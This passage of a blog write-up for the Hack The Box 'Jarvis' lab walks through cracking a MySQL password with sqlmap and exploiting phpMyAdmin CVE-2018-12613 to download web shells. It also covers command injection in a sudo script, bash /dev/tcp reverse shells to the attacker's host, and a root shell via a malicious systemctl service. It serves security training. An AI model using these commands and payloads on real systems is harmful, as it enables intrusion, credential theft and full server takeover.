+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>[11:56:37] [INFO] the back-end DBMS is MySQL
+</span></span><span style="display:flex;"><span>web server operating system: Linux Debian 9.0 (stretch)
+</span></span><span style="display:flex;"><span>web application technology: Apache 2.4.25
+</span></span><span style="display:flex;"><span>back-end DBMS: MySQL &gt;= 5.0.12
+</span></span><span style="display:flex;"><span>[11:56:37] [INFO] fetching database users
+</span></span><span style="display:flex;"><span>[11:56:37] [INFO] used SQL query returns 28 entries
+</span></span><span style="display:flex;"><span>database management system users [1]:                                                 
+</span></span><span style="display:flex;"><span>[*] &#39;DBadmin&#39;@&#39;localhost&#39;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[11:56:37] [INFO] fetching database users password hashes
+</span></span><span style="display:flex;"><span>[11:56:37] [INFO] used SQL query returns 1 entry
+</span></span><span style="display:flex;"><span>do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+</span></span><span style="display:flex;"><span>[11:56:41] [INFO] writing hashes to a temporary file &#39;/tmp/sqlmapgPiv8o5143/sqlmaphashes-NceIbU.txt&#39; 
+</span></span><span style="display:flex;"><span>do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] y
+</span></span><span style="display:flex;"><span>[11:56:44] [INFO] using hash method &#39;mysql_passwd&#39;
+</span></span><span style="display:flex;"><span>[11:56:44] [INFO] resuming password &#39;imissyou&#39; for hash &#39;*2d2b7a5e4e637b8fba1d17f40318f277d29964d0&#39; for user &#39;DBadmin&#39;
+</span></span><span style="display:flex;"><span>database management system users password hashes:
+</span></span><span style="display:flex;"><span>[*] DBadmin [1]:
+</span></span><span style="display:flex;"><span>    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+</span></span><span style="display:flex;"><span>    clear-text password: imissyou
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[11:56:44] [INFO] fetched data logged to text files under &#39;/root/.sqlmap/output/10.10.10.143&#39;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] ending @ 11:56:44 /2019-07-22/
+</span></span></code></pre></div><p>Above we see that sqlmap has found the password for the user <code>DBadmin</code> to be <code>imissyou</code>.</p>
+<p>Now that we have the admin login credentials to MySQL we are able to login to <code>phpmyadmin</code> and exploit it to gain a shell.</p>
+<p><img src="/posts/images/hack-the-box-jarvis-writeup/phpmyadmin_loggedin.png" alt="phpMyAdmin control panel.">
+<strong>Figure 3:</strong> phpMyAdmin control panel.</p>
+<h3 id="apache-setup">Apache Setup</h3>
+<p>I&rsquo;m already aware from previous machines that <a href="https://hackthebod.eu" target="_blank">HTB&rsquo;s</a> boxes don&rsquo;t allow connecting to github in order to download things we regularly need. So, this time we&rsquo;re going to use Kali&rsquo;s apache server to host some of our own tools to easily download to the box when we get our first shell. We will start the apache service on kali with <code>service apache2 start</code>. Then, place our two php shells in the <code>/var/www/html</code> directory, but with the <code>.txt</code> extension instead of <code>.php</code>. It&rsquo;s always convenient to also include the latest versions of <a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank">lse.sh</a>, <a href="https://github.com/DominicBreuker/pspy" target="_blank">pyspy</a>, and your public key.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/var/www/html# ls -la
+</span></span><span style="display:flex;"><span>total 4460
+</span></span><span style="display:flex;"><span>drwxr-xr-x 2 root root    4096 Jul 22 21:04 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x 3 root root    4096 Feb 11 02:35 ..
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 root root     391 Jul 22 13:23 id_rsa.pub
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 root root   10701 Jan 30 02:12 index.html
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 root root   30972 Jul 22 13:23 lse.sh
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 root root    5493 Jul 22 13:23 php-reverse-shell.txt
+</span></span><span style="display:flex;"><span>-rwxrwx--- 1 root root 4468984 Jul 22 13:23 pspy64
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 root root   15744 Jul 22 13:23 shell.txt
+</span></span></code></pre></div><h3 id="cve-2018-12613">CVE-2018-12613</h3>
+<p>In order to exploit the vulnerability, we first navigate to the SQL Tab and run the following query.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#39;&lt;?php exec(&#34;wget -O /var/www/html/shell.php http://10.10.14.61/shell.txt &amp;&amp; wget -O /var/www/html/rshell.php http://10.10.14.61/php-reverse-shell.txt &#34;);  ?&gt;&#39;</span>
+</span></span></code></pre></div><p>The query contains php calling <code>exec</code> to execute shell commands which <code>wget</code> the two php shells we put onto our Kali box&rsquo;s apache server, and changing their extensions to <code>.php</code>.</p>
+<p><img src="/posts/images/hack-the-box-jarvis-writeup/if_1.png" alt="CVE-2018-12613 Setp 1.">
+<strong>Figure 4:</strong> Paset in malicious query containing php code, click &lsquo;go&rsquo;.</p>
+<p><img src="/posts/images/hack-the-box-jarvis-writeup/if2.png" alt="CVE-2018-12613 Setp 2.">
+<strong>Figure 5:</strong> Query executed, malicious php code stored in database.</p>
+<p>To execute the code we&rsquo;ve just stored, we must first determine the value of our session variable, and append it to the url <code>http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_FILLMEINS</code></p>
+<p>For this we use the <a href="https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/" target="_blank">Cookie-Editor</a> Firefox Extension, and check the value of the <code>phpMyAdmin</code> cookie.</p>
+<p><img src="/posts/images/hack-the-box-jarvis-writeup/if3.png" alt="CVE-2018-12613 Setp 2.">
+<strong>Figure 6:</strong> phpMyAdmin session.</p>
+<p>Now that the session variable is known we navigate to the url in order to execute our php code.</p>
+<pre tabindex="0"><code>http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_rgaqjb5lk26btifbs4alv75bj4hm1ljj
+</code></pre><p><img src="/posts/images/hack-the-box-jarvis-writeup/if4.png" alt="CVE-2018-12613 Setp 2.">
+<strong>Figure 7:</strong> php execution.</p>
+<p>We now have our p0wny webshell available on <code>http://10.10.10.143/shell.php</code>. Our reverse shell is also available, and that&rsquo;s what we&rsquo;re going to use mostly for the rest of the box. Start netcat to have it listen <code>nc -lvp 4444</code>. Then call <code>rshell.php</code> either by navigating to <code>http://10.10.10.143/rshell.php</code>, or via the web shell. We issue the following command to get a more interactive shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+</span></span></code></pre></div><p><img src="/posts/images/hack-the-box-jarvis-writeup/ncshell1.png" alt="php reverse shell.">
+<strong>Figure 8:</strong> php reverse shell as www-data user.</p>
+<h3 id="linux-smart-enumeration">Linux Smart Enumeration</h3>
+<p>After grabbing Linux Smart Enumeration we run it and discover two particularly interesting things.</p>
+<p><img src="/posts/images/hack-the-box-jarvis-writeup/lse.png" alt="Linux Smart Enumeration.">
+<strong>Figure 9:</strong> Linux Smart Enumeration.</p>
+<p>We see that there are uncommon setuid binaries, and that the user <code>www-data</code> has access to run an administration tool as <code>pepper</code> (without entering a password).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>User www-data may run the following commands on jarvis:
+</span></span><span style="display:flex;"><span>    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
+</span></span></code></pre></div><h2 id="user-flag">User Flag</h2>
+<p>Let&rsquo;s read the source code for <em><strong><a href="https://gist.github.com/d0n601/270adf14cca07f438d3564ec3333f84c" target="_blank">simpler.py</a></strong></em>. The function that jumps out as exploitable is <code>exec_ping()</code>, since it directly runs user input.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exec_ping</span>():
+</span></span><span style="display:flex;"><span>    forbidden <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;&amp;&#39;</span>, <span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">&#39;-&#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;||&#39;</span>, <span style="color:#e6db74">&#39;|&#39;</span>]
+</span></span><span style="display:flex;"><span>    command <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#39;Enter an IP: &#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> forbidden:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">in</span> command:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;Got you&#39;</span>)
+</span></span><span style="display:flex;"><span>            exit()
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;ping &#39;</span> <span style="color:#f92672">+</span> command)
+</span></span></code></pre></div><p>Full source for <em><strong><a href="https://gist.github.com/d0n601/270adf14cca07f438d3564ec3333f84c" target="_blank">simpler.py</a></strong></em></p>
+<p>The function filters certain commands to prevent us from injecting naughty things into it. It does not, however, filter out the <code>$</code> character which means we can encapsulate a bash command.</p>
+<blockquote>
+<p>A bash command can then be encapsulated using the $()
+technique.</p>
+</blockquote>
+<p><strong>Source:</strong> <a href="https://packetstormsecurity.com/files/144749/Infoblox-NetMRI-7.1.4-Shell-Escape-Privilege-Escalation.html" target="_blank">PacketStorm</a></p>
+<p>Even though we are the <code>www-data</code> user, we&rsquo;re able to execute <code>simpler.py</code> as the <code>pepper</code> like such,</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>www-data@jarvis:/var/www/Admin-Utilities$ sudo -u pepper ./simpler.py -p
+</span></span></code></pre></div><p>Enter <code>$(/bin/bash)</code> into the prompt for the <code>-p</code> command to spawn a shell as the <code>pepper</code> user. What was odd is that this new shell did not return anything to the screen. Meaning commands like <code>ls</code>, <code>pwd</code>, and <code>cat</code> returned nothing. Perhaps someone else could explain why this was for me?</p>
+<p>Anyway, we can spawn another reverse shell as the <code>pepper</code> user now though via <code>bash -i &gt;&amp; /dev/tcp/10.10.14.61/6666 0&gt;&amp;1</code>. With this shell we can grab <code>cat user.txt</code>.</p>
+<p><img src="/posts/images/hack-the-box-jarvis-writeup/user_flag.png" alt="user flag.">
+<strong>Figure 10:</strong> user flag <em><strong>2afa36c4f05b37b34259c93551f5c44f</strong></em>.</p>
+<h2 id="root-flag">Root Flag</h2>
+<p>In order to escalate our privileges from <code>pepper</code> to <code>root</code>, we first need to check which binaries have the SUID bit flipped, meaning they run as the owner, not the user who started them.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>find / -perm -u=s -type f 2&gt;/dev/null
+</span></span></code></pre></div><p>The above returns many programs from the <code>/bin</code> directory. So lets check up the permissions of the binaries in that directory.</p>
+<p><img src="/posts/images/hack-the-box-jarvis-writeup/systemctl_misconfig.png" alt="user flag.">
+<strong>Figure 11:</strong> Look who owns systemctl!</p>
+<h3 id="privilege-escalation-a-proper-shell">Privilege Escalation: A proper shell</h3>
+<p>In order to exploit <code>systemctl</code> we need a proper shell. The below method does not function on a reverse shell, as we cannot enable services through it. This was discovered via trial and error, and I can&rsquo;t explain exactly as to why.</p>
+<p>To get the shell we need we&rsquo;re simply going to take the public key we&rsquo;ve got on our apache server and copy it into <code>~/.ssh/authorized_keys</code>. It may be the case that we need to create this directory and file, if no other HTB users have done it since the box has been reset.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>pepper@jarvis:~/.ssh$ cd /tmp
+</span></span><span style="display:flex;"><span>cd /tmp
+</span></span><span style="display:flex;"><span>pepper@jarvis:/tmp$ wget http://10.10.14.61/id_rsa.pub
+</span></span><span style="display:flex;"><span>wget http://10.10.14.61/id_rsa.pub
+</span></span><span style="display:flex;"><span>--2019-07-23 21:29:15--  http://10.10.14.61/id_rsa.pub
+</span></span><span style="display:flex;"><span>Connecting to 10.10.14.61:80... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... 200 OK
+</span></span><span style="display:flex;"><span>Length: 391
+</span></span><span style="display:flex;"><span>Saving to: &#39;id_rsa.pub&#39;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>     0K                                                       100% 91.7M=0s
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>2019-07-23 21:29:16 (91.7 MB/s) - &#39;id_rsa.pub&#39; saved [391/391]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>pepper@jarvis:/tmp$ cat id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys
+</span></span></code></pre></div><p><img src="/posts/images/hack-the-box-jarvis-writeup/ssh_pepper.png" alt="ssh as pepper.">
+<strong>Figure 12:</strong> SSH&rsquo;ing in directly using our public key.</p>
+<h3 id="exploiting-systemctl">Exploiting systemctl</h3>
+<p>Since we know that the <code>systemctl</code> binary is going to be run as <code>root</code>, let&rsquo;s create our own service to call a reverse shell (as root!).</p>
+<p>First we create our script to call a reverse shell, we&rsquo;ll call it <code>shelly.sh</code>. This time we have netcat listening on port <code>7777</code>. We also need to <code>chmod +x /tmp/shelly.sh</code> so that it&rsquo;s executable.</p>
+<pre tabindex="0"><code>#!/bin/bash  
+bash -i &gt;&amp; /dev/tcp/10.10.14.61/7777 0&gt;&amp;1
+</code></pre><p>Next we create <code>revshell_root.service</code> to execute our reverse shell as root.</p>
+<pre tabindex="0"><code>[Unit]
+Description=root shell
+
+[Service]
+ExecStart=/tmp/shelly.sh
+
+[Install]
+WantedBy=multi-user.target
+</code></pre><p>Once <code>shelly.sh</code> and <code>revshell_root.service</code> are in the <code>/tmp</code> directory, we enable the services through <code>systemctl</code>, and then start the service. Upon starting the service our reverse shell is triggered, and we&rsquo;re root!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>pepper@jarvis:/tmp$ systemctl enable /tmp/revshell_root.service
+</span></span><span style="display:flex;"><span>Created symlink /etc/systemd/system/multi-user.target.wants/revshell_root.service → /tmp/revshell_root.service.
+</span></span><span style="display:flex;"><span>Created symlink /etc/systemd/system/revshell_root.service → /tmp/revshell_root.service.
+</span></span><span style="display:flex;"><span>pepper@jarvis:/tmp$ systemctl start revshell_root.service
+</span></span></code></pre></div><p><img src="/posts/images/hack-the-box-jarvis-writeup/rooted.png" alt="rooted.">
+<strong>Figure 13:</strong> Root Shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@jarvis:~# cat root.txt
+</span></span><span style="display:flex;"><span>cat root.txt
+</span></span><span style="display:flex;"><span>d41d8cd98f00b204e9800998ecf84271
+</span></span></code></pre></div><h1 id="conclusion">Conclusion</h1>
+<p>I learned a lot from this box. I learned just how powerful a tool <code>sqlmap</code> is. I&rsquo;m very new to using this tool, and apparently I could have used it to spawn a shell directly. Perhaps I wouldn&rsquo;t have needed to exploit phpmyadmin in this case? That&rsquo;s something I&rsquo;ll certainly look into next.</p>
+<p>This box also taught me a little more about <code>systemctl</code> and the syntax to create and run new services.</p>
+<p>I&rsquo;m really interested in reading other people&rsquo;s writeups to see what other methods could be used to root this box. Jarvis seemed to have many different solutions, which is very cool. I&rsquo;m excited to see if the LLMNR port came into play at all for anyone, what other methods people used to gain their initial foothold, and how many different ways there were for escalating privileges from <code>www-data</code> to <code>pepper</code>, and from <code>pepper</code> to <code>root</code>.</p>
+<h2 id="references">References</h2>
+<ol>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-12613" target="_blank">https://nvd.nist.gov/vuln/detail/CVE-2018-12613</a></li>
+<li><a href="https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/" target="_blank">https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/</a></li>
+<li><a href="https://security.stackexchange.com/questions/212427/why-doesnt-my-systemctl-command-work" target="_blank">https://security.stackexchange.com/questions/212427/why-doesnt-my-systemctl-command-work</a></li>
+<li><a href="https://packetstormsecurity.com/files/144749/Infoblox-NetMRI-7.1.4-Shell-Escape-Privilege-Escalation.html" target="_blank">https://packetstormsecurity.com/files/144749/Infoblox-NetMRI-7.1.4-Shell-Escape-Privilege-Escalation.html</a></li>
+<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></li>
+</ol>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="http://localhost:1313/posts/hack-the-box-haystack-writeup/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Hack the Box Haystack Writeup</a>
+        
+	    
+            <div class="next-post">
+                <a href="http://localhost:1313/posts/bad-usb-botnet/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Bad Usb Botnet</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+
+        </div>
+    </body>
+</html>
